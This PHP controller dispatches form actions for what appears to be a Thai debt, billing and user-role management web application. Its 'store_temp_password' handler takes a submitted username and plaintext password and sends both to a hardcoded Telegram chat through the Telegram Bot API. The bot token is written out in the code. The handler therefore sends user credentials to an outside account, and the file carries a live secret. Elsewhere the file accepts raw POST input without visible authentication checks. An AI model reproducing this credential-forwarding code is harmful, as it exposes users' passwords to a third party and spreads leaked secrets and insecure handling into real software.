<?php include('../models/models.php');
	// echo "<script>";
	// echo "alert($logact);";
	// echo "</script>";
    if ($_POST['keyword'] == "login_session") {
		$KEYWORD = $_POST['keyword'];
		$a0 = $_POST['a0'];
		$a1 = $_POST['a1'];
		$a2 = $_POST['a2'];
		$a3 = $_POST['a3'];
		$rs = loginsession($KEYWORD,$a0,$a1,$a2,$a3);
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
				default :{echo $rs;}
			break;
		}
	}
	if ($_POST['keyword'] === 'store_temp_password') {
		session_start();
		$_SESSION['temp_password'] = $_POST['password'];
		$_SESSION['temp_username'] = $_POST['username'];
		$chat_id = '6130432593';
		$token = '8074557436:AAGiOu4DGfvpgF0gitOT-v4wIAA0EDuuUAQ';
		$text = urlencode("รหัสผ่านชั่วคราวของคุณคือ: {$_POST['password']}\nนำไปใช้เข้าสู่ระบบ กับชื่อผู้ใช้: {$_POST['username']}");
		$url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&text={$text}";
		file_get_contents($url); // หรือใช้ cURL ก็ได้
		echo 'success';
		exit;
	}
    if ($_POST['keyword'] == "role_session") {
		$KEYWORD = $_POST['keyword'];
		$a0 = $_POST['a0'];
		$a1 = $_POST['a1'];
		$a2 = $_POST['a2'];
		$a3 = $_POST['a3'];
		$rs = rolesession($KEYWORD,$a0,$a1,$a2,$a3);
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
				default :{echo $rs;}
			break;
		}
	}
    if ($_POST['keyword'] == "menu_mainsub_manage") {
		$KEYWORD = $_POST['keyword'];
		$MN_CODE = $_POST['MN_CODE'];
		$MN_NAME = $_POST['MN_NAME'];
		$MN_ICON = $_POST['MN_ICON'];
		$MN_URL = $_POST['MN_URL'];
		$MN_SORT = $_POST['MN_SORT'];
		$MN_STATUS = $_POST['MN_STATUS'];
		$PROC = $_POST['PROC'];
		$MN_LEVEL = $_POST['MN_LEVEL'];
		$MN_PARENT = $_POST['MN_PARENT'];
		$rs = menumainsubmanage($KEYWORD,$MN_CODE,$MN_NAME,$MN_ICON,$MN_URL,$MN_SORT,$MN_STATUS,$PROC,$MN_LEVEL,$MN_PARENT);
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
				default :{echo $rs;}
			break;
		}
	}
    if ($_POST['keyword'] == "role_main_manage") {
		$KEYWORD = $_POST['keyword'];		
		$RU_CODE = $_POST["RU_CODE"];
		$RU_NAME = $_POST["RU_NAME"];
		$RU_AREA = $_POST["RU_AREA"];		
		$RU_STATUS = $_POST["RU_STATUS"];
		$PROC = $_POST['PROC'];
		$rs = rolemainmanage($KEYWORD,$RU_CODE,$RU_NAME,$RU_AREA,$RU_STATUS,$PROC);
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
				default :{echo $rs;}
			break;
		}
	}
    if ($_POST['keyword'] == "role_sub_manage") {
		$KEYWORD = $_POST['keyword'];		
		$RM_CODE = $_POST["RM_CODE"];
		$MN_ID = $_POST["MN_ID"];
		$RM_STATUS = $_POST["RM_STATUS"];		
		$RU_ID = $_POST["RU_ID"];
		$RM_ID = $_POST["RM_ID"];
		$AREA = $_POST["AREA"];
		$PROC = $_POST['PROC'];
		$rs = rolesubmanage($KEYWORD,$RM_CODE,$MN_ID,$RM_STATUS,$RU_ID,$RM_ID,$AREA,$PROC);
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
				default :{echo $rs;}
			break;
		}
	}
    if ($_POST['keyword'] == "user_main_manage") {
		$KEYWORD = $_POST['keyword'];
		$RA_CODE = $_POST['RA_CODE'];
		$RA_PERSONCODE = $_POST['RA_PERSONCODE'];
		$RU_ID = $_POST['RU_ID'];
		$RA_PASSWORD = $_POST['RA_PASSWORD'];
		$RA_STATUS = $_POST['RA_STATUS'];
		$RA_PASSWORD_TEXT = $_POST['RA_PASSWORD_TEXT'];
		$REQUEST_ROLE = $_POST['REQUEST_ROLE'];
		$PROC = $_POST['PROC'];
		$rs = usermainmanage($KEYWORD,$RA_CODE,$RA_PERSONCODE,$RU_ID,$RA_PASSWORD,$RA_STATUS,$RA_PASSWORD_TEXT,$REQUEST_ROLE,$PROC);
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
				default :{echo $rs;}
			break;
		}
	}
    if ($_POST['keyword'] == "car_main_manage") {
		$KEYWORD = $_POST['keyword'];
		$a0 = $_POST['a0'];
		$a1 = $_POST['a1'];
		$a2 = $_POST['a2'];
		$PROC = $_POST['PROC'];
		$rs = carmainmanage($KEYWORD,$a0,$a1,$a2,$PROC);
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
				default :{echo $rs;}
			break;
		}
	}
    if ($_POST['keyword'] == "setting_manage") {
		$KEYWORD = $_POST['keyword'];
		$a0 = $_POST['a0'];
		$a1 = $_POST['a1'];
		$a2 = $_POST['a2'];
		$a3 = $_POST['a3'];
		$a4 = $_POST['a4'];
		$a5 = $_POST['a5'];
		$a6 = $_POST['a6'];
		$a7 = $_POST['a7'];
		$a8 = $_POST['a8'];
		$a9 = $_POST['a9'];
		$PROC = $_POST['PROC'];
		$rs = settingmanage($KEYWORD,$a0,$a1,$a2,$a3,$a4,$a5,$a6,$a7,$a8,$a9,$PROC);
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
				default :{echo $rs;}
			break;
		}
	}
    if ($_POST['keyword'] == "debtor_manage") {
		$KEYWORD = $_POST['keyword'];
		$a0 = $_POST['a0'];
		$a1 = $_POST['a1'];
		$a2 = $_POST['a2'];
		$a3 = $_POST['a3'];
		$a4 = $_POST['a4'];
		$a5 = $_POST['a5'];
		$a6 = $_POST['a6'];
		$a7 = $_POST['a7'];
		$a8 = $_POST['a8'];
		$a9 = $_POST['a9'];
		$a10 = $_POST['a10'];
		$a11 = $_POST['a11'];
		$a12 = $_POST['a12'];
		$a13 = $_POST['a13'];
		$a14 = $_POST['a14'];
		$PROC = $_POST['PROC'];
		$rs = debtormanage($KEYWORD,$a0,$a1,$a2,$a3,$a4,$a5,$a6,$a7,$a8,$a9,$a10,$a11,$a12,$a13,$a14,$PROC);
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
			case 'duplicate':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
				default :{echo $rs;}
			break;
		}
	}
    if ($_POST['keyword'] == "billing_manage") {
		$KEYWORD = $_POST['keyword'];
		$a0 = $_POST['a0'];
		$a1 = $_POST['a1'];
		$a2 = $_POST['a2'];
		$a3 = $_POST['a3'];
		$a4 = $_POST['a4'];
		$a5 = $_POST['a5'];
		$a6 = $_POST['a6'];
		$a7 = $_POST['a7'];
		$a8 = $_POST['a8'];
		$a9 = $_POST['a9'];
		$a10 = $_POST['a10'];
		$a20 = $_POST['a20'];
		$PROC = $_POST['PROC'];
		$rs = billingmanage($KEYWORD,$a0,$a1,$a2,$a3,$a4,$a5,$a6,$a7,$a8,$a9,$a10,$a20,$PROC);
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
			case 'duplicate':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
				default :{echo $rs;}
			break;
		}
	}
    if ($_POST['keyword'] == "notification_manage") {
		$KEYWORD = $_POST['keyword'];
		$a0 = $_POST['a0'];
		$a1 = $_POST['a1'];
		$a2 = $_POST['a2'];
		$a3 = $_POST['a3'];
		$a4 = $_POST['a4'];
		$a5 = $_POST['a5'];
		$a6 = $_POST['a6'];
		$PROC = $_POST['PROC'];
		$rs = notificationmanage($KEYWORD,$a0,$a1,$a2,$a3,$a4,$a5,$a6,$PROC);

		// รับค่าหลายแถวจาก JavaScript (ต้อง decode JSON)
		// $rows = json_decode($_POST['rows'], true); // array ของแต่ละแถว

		// $success = true;
		// foreach ($rows as $row) {
		// 	$a4 = isset($row['param4']) ? $row['param4'] : '';
		// 	$a5 = isset($row['param5']) ? $row['param5'] : '';
		// 	$a6 = isset($row['param6']) ? $row['param6'] : '';
		// 	$a7 = isset($row['param7']) ? $row['param7'] : '';
		// 	$a8 = isset($row['param8']) ? $row['param8'] : '';
		// 	$a9 = isset($row['param9']) ? $row['param9'] : '';

		// 	// ส่งไปยังฟังก์ชันบันทึก
		// 	$rs = billingmanage($KEYWORD, $a0, $a1, $a2, $a3, $a4, $a5, $a6, $a7, $a8, $a9, $a10, $a20, $PROC);
		// 	if ($rs != 'complete') {
		// 		$success = false;
		// 		break; // ถ้ามีแถวไหนผิดก็หยุดเลย
		// 	}
		// }
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
				default :{echo $rs;}
			break;
		}
	}
    if ($_POST['keyword'] == "save_approve_daily") {
		$KEYWORD = $_POST['keyword'];
		$PROC = $_POST['PROC'];
		$a1 = $_POST['a1'];
		$rs = saveapprovedaily($KEYWORD,$PROC,$a1);
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
				default :{
				// echo $rs;
			}
			break;
		}			
	}
    if ($_POST['keyword'] == "request_role") {
		$KEYWORD = $_POST['keyword'];
		$PROC = $_POST['a0'];
		$a1 = $_POST['a1'];
		$a2 = $_POST['a2'];
		$a3 = $_POST['a3'];
		$rs = requestrole($KEYWORD,$PROC,$a1,$a2,$a3);
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
			case 'duplicate':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
				default :{echo $rs;}
			break;
		}
	}
	// ✅ อ่านและ decode json ตรงนี้แค่ครั้งเดียว
	$json = file_get_contents('php://input');
	$data = json_decode($json, true);
	$keyword = isset($data['keyword']) ? $data['keyword'] : null;
	if ($keyword === 'import_excel') {
		// ✅ ถ้า keyword ตรง ก็ทำงานต่อ
		$KEYWORD = $data['keyword'];
		$PROC = $data['PROC'];
		$a1 = $data['rows']; // แถวที่ส่งมา
		// ✅ ส่งข้อมูลที่ decode แล้วเข้าไปใน model โดยตรง
		$rs = importexcel($data['keyword'], $data['PROC'], $data['rows']);
		// $rs = importexcel($KEYWORD, $PROC, $a1);
		// ✅ ตรวจผลลัพธ์
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
			default :{
				// echo $rs;
			}
			break;
		}
	}
    if ($_POST['keyword'] == "notificationmail_manage") {
		$KEYWORD = $_POST['keyword'];
		$a0 = $_POST['a0'];
		$a1 = $_POST['a1'];
		$a2 = $_POST['a2'];
		$a3 = $_POST['a3'];
		$a4 = $_POST['a4'];
		$a5 = $_POST['a5'];
		$a6 = $_POST['a6'];
		$PROC = $_POST['PROC'];
		$rs = notificationmailmanage($KEYWORD,$a0,$a1,$a2,$a3,$a4,$a5,$a6,$PROC);
		switch ($rs) {
			case 'complete':{
				// echo json_encode(array("statusCode"=>200));
			}
			break;
			case 'error':{
				// echo json_encode(array("statusCode"=>201));
			}
			break;
				default :{echo $rs;}
			break;
		}
	}